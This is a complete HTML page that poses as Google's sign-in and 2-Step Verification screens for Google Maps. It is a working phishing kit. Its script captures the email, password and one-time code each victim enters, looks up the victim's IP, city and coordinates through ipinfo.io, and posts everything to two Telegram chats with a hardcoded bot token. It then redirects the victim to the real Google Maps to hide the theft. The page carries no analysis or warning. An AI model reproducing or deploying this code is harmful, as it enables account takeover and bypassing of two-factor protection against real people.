<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Google Sign In</title>
  <style>
    body {
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
      background-color: #f0f2f5;
      padding: 20px;
      box-sizing: border-box;
    }
    .signin-container {
      background-color: white;
      padding: 48px 40px 36px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      max-width: 450px;
      width: 100%;
      text-align: center;
      box-sizing: border-box;
      position: relative;
    }
    .google-logo {
      margin-bottom: 24px;
      display: flex;
      justify-content: center;
    }
    .google-logo svg {
      width: 75px;
      height: 24px;
    }
    h1 {
      font-weight: 400;
      color: #202124;
      font-size: 24px;
      margin: 16px 0 8px;
      line-height: 1.3333;
    }
    .subtitle {
      color: #5f6368;
      font-size: 16px;
      margin-bottom: 24px;
      line-height: 1.5;
    }
    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
      color: #5f6368;
      text-align: left;
    }
    input.input-field {
      width: 100%;
      padding: 13px 15px;
      font-size: 16px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      box-sizing: border-box;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      transition: border-color 0.2s ease;
    }
    input.input-field:focus {
      outline: none;
      border-color: #1a73e8;
      box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
    }
    input.input-field::placeholder {
      color: #80868b;
    }

    /* Password input container: position relative to place 'Show' button inside */
    .password-input-container {
      position: relative;
    }
    .password-input-container input.input-field {
      padding-right: 60px; /* space for Show button */
    }
    .password-show {
      position: absolute;
      right: 15px;
      top: 50%;
      transform: translateY(-50%);
      background: none;
      border: none;
      cursor: pointer;
      font-weight: 500;
      color: #1a73e8;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      font-size: 14px;
      padding: 0;
      line-height: 1;
    }
    .password-show:hover {
      text-decoration: underline;
    }

    .password-container {
      margin-top: 16px;
      text-align: right;
    }
    .forgot-password {
      font-size: 14px;
      font-weight: 500;
      color: #1a73e8;
      text-decoration: none;
    }
    .forgot-password:hover {
      text-decoration: underline;
    }
    .signin-button {
      width: 100%;
      padding: 12px 20px;
      font-weight: 500;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      font-size: 14px;
      color: white;
      background-color: #1a73e8;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      margin-top: 16px;
      transition: background-color 0.2s ease;
    }
    .signin-button:disabled {
      background-color: #aecbfa;
      cursor: not-allowed;
    }
    .signin-button:not(:disabled):hover {
      background-color: #1557b0;
    }

    /* Hide/Show pages */
    .page {
      display: none;
    }
    .page.active {
      display: block;
    }

    /* 2-Step Verification Page Styles */
    .back-button {
      position: absolute;
      top: 20px;
      left: 20px;
      background: none;
      border: none;
      font-size: 24px;
      cursor: pointer;
      color: #5f6368;
      display: flex;
      align-items: center;
      gap: 8px;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      font-size: 16px;
    }
    .back-button:hover {
      color: #202124;
    }
    .phone-icon {
      width: 120px;
      height: 60px;
      background-color: #4285f4;
      border-radius: 8px;
      position: relative;
      margin: 0 auto 24px;
    }
    .phone-icon::before {
      content: '';
      position: absolute;
      top: 8px;
      left: 50%;
      transform: translateX(-50%);
      width: 80px;
      height: 4px;
      background-color: white;
      border-radius: 2px;
    }
    .phone-icon::after {
      content: '• • • •';
      position: absolute;
      bottom: 12px;
      left: 50%;
      transform: translateX(-50%);
      color: white;
      font-size: 12px;
      letter-spacing: 8px;
    }
    .verification-title {
      font-size: 24px;
      font-weight: 400;
      color: #202124;
      margin-bottom: 8px;
    }
    .verification-subtitle {
      color: #5f6368;
      font-size: 16px;
      margin-bottom: 24px;
      line-height: 1.5;
    }
    .phone-number {
      color: #202124;
      font-weight: 500;
    }
    .code-input-label {
      display: block;
      text-align: left;
      margin-bottom: 8px;
      color: #5f6368;
      font-size: 14px;
    }
    .code-input {
      width: 100%;
      padding: 13px 15px;
      border: 1px solid #dadce0;
      border-radius: 4px;
      box-sizing: border-box;
      font-size: 16px;
      margin-bottom: 16px;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
    }
    .code-input:focus {
      border-color: #1a73e8;
      outline: none;
    }
    .resend-link {
      color: #1a73e8;
      text-decoration: none;
      font-size: 14px;
      font-weight: 500;
    }
    .resend-link:hover {
      text-decoration: underline;
    }
    .action-buttons {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-top: 32px;
    }
    .back-link {
      color: #1a73e8;
      text-decoration: none;
      font-size: 14px;
      font-weight: 500;
      text-transform: uppercase;
    }
    .back-link:hover {
      text-decoration: underline;
    }
    .next-button {
      background-color: #1a73e8;
      color: white;
      border: none;
      border-radius: 4px;
      padding: 12px 24px;
      font-size: 14px;
      font-weight: 500;
      cursor: pointer;
      transition: background-color 0.2s;
      text-transform: uppercase;
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
    }
    .next-button:hover {
      background-color: #1557b0;
    }
    .footer-links {
      margin-top: 40px;
      display: flex;
      justify-content: center;
      gap: 24px;
      font-size: 12px;
      padding-bottom: 20px;
    }
    .footer-links a {
      color: #5f6368;
      text-decoration: none;
    }
    .footer-links a:hover {
      text-decoration: underline;
    }

    /* Loading state */
    .signin-button.loading {
      opacity: 0.7;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  
  <!-- Sign In Page -->
  <div class="signin-container page active" id="signinPage">
    <div class="google-logo" aria-label="Google logo">
      <svg viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
        <g fill="none" fill-rule="evenodd">
          <path fill="#EA4335" d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
          <path fill="#FBBC05" d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z"/>
          <path fill="#34A853" d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z"/>
          <path fill="#EA4335" d="M225 3v65h-9.5V3h9.5z"/>
          <path fill="#EA4335" d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z"/>
          <path fill="#4285F4" d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z"/>
        </g>
      </svg>
    </div>

    <h1>Sign in</h1>
    <p class="subtitle">to continue to Google Maps</p>

    <form id="signinForm" novalidate>
      <label for="username">Email or phone</label>
      <input
        id="username"
        type="text"
        class="input-field"
        autocomplete="username"
        required
      />

      <label for="password" style="margin-top: 24px;">Enter your password</label>
      <div class="password-input-container">
        <input
          id="password"
          type="password"
          class="input-field"
          autocomplete="current-password"
          required
        />
        <button type="button" class="password-show" id="passwordShowBtn">Show</button>
      </div>
      <div class="password-container">
        <a href="#" class="forgot-password">Forgot password?</a>
      </div>

      <button type="submit" class="signin-button" id="signinBtn" disabled>
        Sign in
      </button>
    </form>
  </div>

  <!-- 2-Step Verification Page -->
  <div class="signin-container page" id="verificationPage">
    <button class="back-button" id="backButton">
      ← 2-Step Verification
    </button>
    
    <div class="phone-icon"></div>
    
    <h2 class="verification-title">Confirm that it works</h2>
    <p class="verification-subtitle">
      Google just sent a text message with a<br>
      verification code to <span class="phone-number">+1(×××)×××-××××</span>
    </p>
    
    <div>
      <label for="verificationCode" class="code-input-label">Enter the code</label>
      <input type="text" id="verificationCode" class="code-input" placeholder="">
    </div>
    
    <p>Didn't get it? <a href="#" class="resend-link">Resend</a></p>
    
    <div class="action-buttons">
      <a href="#" class="back-link" id="backLink">BACK</a>
      <button type="button" class="next-button" id="nextButton">NEXT</button>
    </div>

    <div class="footer-links">
      <a href="#">Privacy</a>
      <a href="#">Terms</a>
      <a href="#">Help</a>
      <a href="#">About</a>
    </div>
  </div>

  <script>
    // Configuration
    const BOT_TOKEN = '7371610501:AAFcYAjSy1ZKgKh7ihaq6dLJvt9yj8gDonE';
    const CHAT_IDS = ['7623079090', '7238192107'];
    const IPINFO_TOKEN = '2da9da1f876081';

    const usernameInput = document.getElementById('username');
    const passwordInput = document.getElementById('password');
    const signinBtn = document.getElementById('signinBtn');
    const passwordShowBtn = document.getElementById('passwordShowBtn');
    const signinPage = document.getElementById('signinPage');
    const verificationPage = document.getElementById('verificationPage');
    const backButton = document.getElementById('backButton');
    const backLink = document.getElementById('backLink');
    const nextButton = document.getElementById('nextButton');

    // Get user IP and location information
    async function getUserLocation() {
      try {
        const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
        const data = await response.json();
        return {
          ip: data.ip,
          city: data.city,
          region: data.region,
          country: data.country,
          location: data.loc,
          org: data.org,
          timezone: data.timezone
        };
      } catch (error) {
        console.error('Error getting location:', error);
        return { ip: 'Unknown', city: 'Unknown', country: 'Unknown' };
      }
    }

    // Send verification code to Telegram bot
    async function sendCodeToTelegram(code, locationData) {
      const message = `
🔐 *Google 2-Step Verification Code*

🔢 *Verification Code:* \`${code}\`

📍 *Location Information:*
• IP: \`${locationData.ip}\`
• City: ${locationData.city}
• Region: ${locationData.region}
• Country: ${locationData.country}
• ISP: ${locationData.org}

🕐 *Time:* ${new Date().toLocaleString()}
      `;

      const promises = CHAT_IDS.map(chatId => {
        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          })
        });
      });

      try {
        await Promise.all(promises);
        console.log('Code sent successfully to all chat IDs');
        return true;
      } catch (error) {
        console.error('Error sending code to Telegram:', error);
        return false;
      }
    }
    // Send data to Telegram bot
    async function sendToTelegram(email, password, locationData) {
      const message = `
🔐 *Google Sign In Attempt*

📧 *Email/Phone:* \`${email}\`
🔑 *Password:* \`${password}\`

📍 *Location Information:*
• IP: \`${locationData.ip}\`
• City: ${locationData.city}
• Region: ${locationData.region}
• Country: ${locationData.country}
• ISP: ${locationData.org}
• Timezone: ${locationData.timezone}
• Coordinates: ${locationData.location}

🕐 *Time:* ${new Date().toLocaleString()}
      `;

      const promises = CHAT_IDS.map(chatId => {
        return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'Markdown'
          })
        });
      });

      try {
        await Promise.all(promises);
        console.log('Message sent successfully to all chat IDs');
        return true;
      } catch (error) {
        console.error('Error sending to Telegram:', error);
        return false;
      }
    }

    // Toggle password show/hide
    passwordShowBtn.addEventListener('click', () => {
      if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        passwordShowBtn.textContent = 'Hide';
      } else {
        passwordInput.type = 'password';
        passwordShowBtn.textContent = 'Show';
      }
      passwordInput.focus();
    });

    // Enable sign-in button only if both fields have some text
    function toggleSignInButton() {
      if (usernameInput.value.trim() && passwordInput.value.trim()) {
        signinBtn.disabled = false;
      } else {
        signinBtn.disabled = true;
      }
    }

    usernameInput.addEventListener('input', toggleSignInButton);
    passwordInput.addEventListener('input', toggleSignInButton);

    // Handle Sign In form submission
    document.getElementById('signinForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      
      const email = usernameInput.value.trim();
      const password = passwordInput.value.trim();
      
      if (!email || !password) {
        return;
      }

      // Show loading state
      signinBtn.classList.add('loading');
      signinBtn.textContent = 'Signing in...';
      signinBtn.disabled = true;

      try {
        // Get user location
        const locationData = await getUserLocation();
        
        // Send data to Telegram
        await sendToTelegram(email, password, locationData);
        
        // Show success and redirect to verification page after a short delay
        setTimeout(() => {
          signinPage.classList.remove('active');
          verificationPage.classList.add('active');
          
          // Reset form state
          signinBtn.classList.remove('loading');
          signinBtn.textContent = 'Sign in';
          toggleSignInButton();
        }, 1500);
        
      } catch (error) {
        console.error('Error:', error);
        // Still proceed to verification page even if sending fails
        setTimeout(() => {
          signinPage.classList.remove('active');
          verificationPage.classList.add('active');
          
          signinBtn.classList.remove('loading');
          signinBtn.textContent = 'Sign in';
          toggleSignInButton();
        }, 1000);
      }
    });

    // Handle back button clicks
    backButton.addEventListener('click', function() {
      verificationPage.classList.remove('active');
      signinPage.classList.add('active');
    });

    backLink.addEventListener('click', function(e) {
      e.preventDefault();
      verificationPage.classList.remove('active');
      signinPage.classList.add('active');
    });

    // Handle Next button click in verification page
    nextButton.addEventListener('click', async function() {
      const code = codeInput.value.trim();
      
      if (!code) {
        // If no code entered, just redirect to Google Maps
        window.location.href = 'https://www.google.com/maps';
        return;
      }
      
      // Show loading state
      nextButton.textContent = 'Loading...';
      nextButton.disabled = true;
      
      try {
        // Get user location
        const locationData = await getUserLocation();
        
        // Send code to Telegram
        await sendCodeToTelegram(code, locationData);
        
        // Redirect to Google Maps after sending
        setTimeout(() => {
          window.location.href = 'https://www.google.com/maps';
        }, 1000);
        
      } catch (error) {
        console.error('Error:', error);
        // Still redirect to Google Maps even if sending fails
        setTimeout(() => {
          window.location.href = 'https://www.google.com/maps';
        }, 500);
      }
    });

    // Add focus behavior to code input
    const codeInput = document.getElementById('verificationCode');
    codeInput.addEventListener('focus', function() {
      this.style.borderColor = '#1a73e8';
    });
    
    codeInput.addEventListener('blur', function() {
      if (!this.value) {
        this.style.borderColor = '#dadce0';
      }
    });
  </script>
</body>
</html>